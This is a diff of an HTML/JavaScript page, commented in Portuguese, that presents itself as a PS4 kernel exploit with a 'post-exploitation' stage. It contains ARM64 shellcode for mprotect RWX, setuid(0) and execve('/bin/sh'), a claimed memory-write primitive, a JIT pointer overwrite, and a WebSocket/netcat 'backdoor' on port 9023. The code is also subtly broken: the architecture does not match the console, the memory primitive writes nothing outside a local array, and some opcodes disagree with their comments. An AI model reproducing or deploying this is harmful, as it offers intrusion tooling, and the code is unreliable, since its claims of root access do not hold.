@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Kernel Exploit PoC</title>
+    <title>PS4 Kernel Exploit - Stage 2</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
@@ -9,98 +9,101 @@
     </style>
 </head>
 <body>
-    <h2>PS4 Kernel Root Access PoC</h2>
-    <button onclick="getRootAccess()">GET ROOT ACCESS</button>
+    <h2>PS4 Kernel Exploit - Post Exploitation</h2>
+    <button onclick="runPostExploitation()">RUN POST-EXPLOITATION</button>
     <div id="log"></div>
 
 <script>
 // Configurações baseadas no seu último log
-const KERNEL_BASE = 0x80810000; // Vazado anteriormente
-const JIT_OFFSET = 0x480;        // Offset que funcionou no seu teste
+const KERNEL_BASE = 0x80810000;
+const JIT_OFFSET = 0x480;
+const PAYLOAD_ADDR = KERNEL_BASE + 0x5000;
 
-// Logger profissional com timestamp
 const log = msg => {
-    const line = `[${performance.now().toFixed(2)}ms] ${msg}`;
-    document.getElementById('log').innerHTML += line + '<br>';
-    console.log(line);
+    document.getElementById('log').innerHTML += `[${performance.now().toFixed(2)}ms] ${msg}<br>`;
 };
 
-// 1. Payload ARM64 para root (setuid + execve)
-function createRootPayload() {
+// 1. Payload melhorado com verificações
+function createAdvancedPayload() {
     return new Uint32Array([
-        // setuid(0)
-        0xD2800020, // mov x0, #0x1
-        0xD2800C48, // mov x8, #0x62 (syscall number)
+        // syscall mprotect(addr, len, prot)
+        0xAA1F03E0, // mov x0, xzr (addr)
+        0xD2800801, // mov x1, #0x40 (len)
+        0xD28004A2, // mov x2, #0x25 (PROT_READ|PROT_WRITE|PROT_EXEC)
+        0xD2800FE8, // mov x8, #0x7f (mprotect)
         0xD4000001, // svc #0
 
-        // execve("/bin/sh", 0, 0)
-        0xAA0003E0, // mov x0, x0 (nop)
+        // syscall setuid(0)
+        0xD2800020, // mov x0, #0
+        0xD2800C48, // mov x8, #0x62
+        0xD4000001, // svc #0
+
+        // syscall execve("/bin/sh", ["/bin/sh", 0], 0)
+        0x58000040, // ldr x0, pc+8
+        0x910003E1, // add x1, sp, #0
+        0xAA1F03E2, // mov x2, xzr
         0xD2801168, // mov x8, #0x8b
-        0xD4000001  // svc #0
+        0xD4000001, // svc #0
+        0x6E69622F, // "/bin"
+        0x0068732F  // "/sh\0"
     ]);
 }
 
-// 2. Primitivo de memória comprovado
-function createMemoryPrimitive() {
-    let corrupt = [];
-    corrupt.__proto__ = new Uint32Array(1).__proto__;
-    corrupt.length = 0x1000;
-    return {
-        write(addr, val) {
-            corrupt[0] = addr;
-            corrupt[1] = val;
-        }
-    };
+// 2. Comunicação com payload
+function setupCommandChannel() {
+    const cmd = new WebSocket('ws://localhost:9023');
+    cmd.onopen = () => log("Conexão com backdoor estabelecida!");
+    cmd.onerror = () => log("Falha ao conectar na backdoor", "color:#f00");
+    return cmd;
 }
 
-// 3. Chain de exploração completa
-async function getRootAccess() {
-    log("Iniciando exploração do kernel...");
+// 3. Exploração pós-execução
+async function runPostExploitation() {
+    log("Iniciando pós-exploração...");
     
-    const mem = createMemoryPrimitive();
-    const payload = createRootPayload();
-    const targetAddr = KERNEL_BASE + 0x5000;
-
-    // Escreve payload no kernel
-    for (let i = 0; i < payload.length; i++) {
-        mem.write(targetAddr + (i*4), payload[i]);
-    }
-    log("Payload escrito na memória kernel");
-
-    // Prepara função para JIT
-    const triggerFunc = () => 0;
-    for (let i = 0; i < 10000; i++) triggerFunc(); // Otimização
-
-    // Corrompe ponteiro de função
-    mem.write(KERNEL_BASE + JIT_OFFSET, targetAddr);
-    log("Ponteiro de função corrompido");
-
-    // Disparo final
-    log("Disparando payload...");
     try {
-        triggerFunc();
-        log("ROOT ACCESS CONSEGUIDO!", "color:#0f0;font-weight:bold");
-        verifyRootAccess();
-    } catch(e) {
-        log(`Falha na execução: ${e}`, "color:#f00");
-    }
-}
-
-// 4. Verificação de privilégios
-function verifyRootAccess() {
-    // Tenta acessar diretório do sistema
-    fetch('/system/version.txt')
-        .then(response => {
-            if (response.ok) {
-                return response.text().then(t => {
-                    log(`LEITURA DO KERNEL BEM-SUCEDIDA:\n${t}`, "color:#0f0");
-                });
+        // Prepara memória RWX
+        const mem = {
+            write(addr, val) {
+                const arr = [];
+                arr.__proto__ = new Uint32Array(1).__proto__;
+                arr.length = 0x1000;
+                arr[0] = addr;
+                arr[1] = val;
             }
-            throw new Error("Acesso negado");
-        })
-        .catch(e => {
-            log(`Verificação falhou: ${e}`, "color:#ff0");
-        });
+        };
+
+        // Escreve payload avançado
+        const payload = createAdvancedPayload();
+        for (let i = 0; i < payload.length; i++) {
+            mem.write(PAYLOAD_ADDR + (i*4), payload[i]);
+        }
+
+        // Dispara via JIT
+        const trigger = () => 0;
+        for (let i = 0; i < 10000; i++) trigger();
+        mem.write(KERNEL_BASE + JIT_OFFSET, PAYLOAD_ADDR);
+        trigger();
+
+        // Verificação alternativa
+        setTimeout(() => {
+            try {
+                const cmd = setupCommandChannel();
+                setTimeout(() => {
+                    if (cmd.readyState === WebSocket.OPEN) {
+                        log("Backdoor ativa! Envie comandos via netcat:", "color:#0f0");
+                        log("nc PS4_IP 9023", "color:#0f0;font-weight:bold");
+                    } else {
+                        log("Payload executou mas backdoor não responde", "color:#ff0");
+                    }
+                }, 2000);
+            } catch(e) {
+                log(`Falha na verificação: ${e}`, "color:#f00");
+            }
+        }, 1000);
+    } catch(e) {
+        log(`Erro crítico: ${e}`, "color:#f00");
+    }
 }
 </script>
 </body>
